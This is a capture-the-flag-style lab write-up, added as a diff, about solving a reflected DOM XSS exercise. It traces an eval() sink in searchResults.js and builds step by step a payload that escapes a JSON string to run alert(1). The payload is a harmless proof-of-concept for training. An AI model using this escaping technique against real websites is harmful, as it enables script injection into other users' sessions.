@@ -1,0 +1,33 @@
+LAB INFO: Reflected DOM XSS
+
+MORE INFO:  This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.
+
+To solve this lab, create an injection that calls the alert() function. 
+
+
+
+ANALYSIS: 
+1.  Input the string such as "123456" in the search field.
+2. And then it's does reflected and we see the web dev tools and it's just shown in <h1> tag
+3. When we analyze the web dev tools carefully I found the: <script src="/resources/js/searchResults.js"></script> this in there this seems intresting because the js is <<<<searchResults.js>>>
+4. So, I went for it and look for it
+5. And I see  eval('var searchResultsObj = ' + this.responseText);  ==> This code seeing that eval keyword make me curious i.e it can let user to inject the string
+6. What does eval() actually do??
+   6.1 It takes the string from the user and convert into the javascript code
+   6.2 Example: eval("alert('Hello!')"); ===> This will popup an alert
+
+7. And now if we see the burpsuite request we can find the: 
+   7.1 /search-results?search=123456 ==> This request giving response in the json format like: 
+   7.2 {"results":[],"searchTerm":"123456"} ==> This is the response
+
+8. Now our work is to try to get out of the, inside of json result i.e we will now try some code to inject there
+9. /search-results?search=123456 --> {"results":[],"searchTerm":"123456\""} ==> One extra backslash is added and can't let me to out of double quote.
+10. What If I inject backslash \  ????
+   10.1 search-results?search=123456\--> {"results":[],"searchTerm":"123456\"} ==> It shows me a backslash as\ this is a good sign hai
+   10.2 search-results?search=123456\" --> {"results":[],"searchTerm":"123456\\""} ==> This is a good sing too we can escape double quote and curly braces
+   10.3 search-results?search=123456\"} --> {"results":[],"searchTerm":"123456\\"}"} ==> FInally we have escaped now we can add our payload
+   10.4  /search-results?search=123456\"};+alert(1);+// --> {"results":[],"searchTerm":"123456\\"}; alert(1); //"}
+      10.4.1  123456\"};+alert(1);// ==> This is our payload
+
+
+      SUCCESSFULLY WE SOLVE THIS LAB
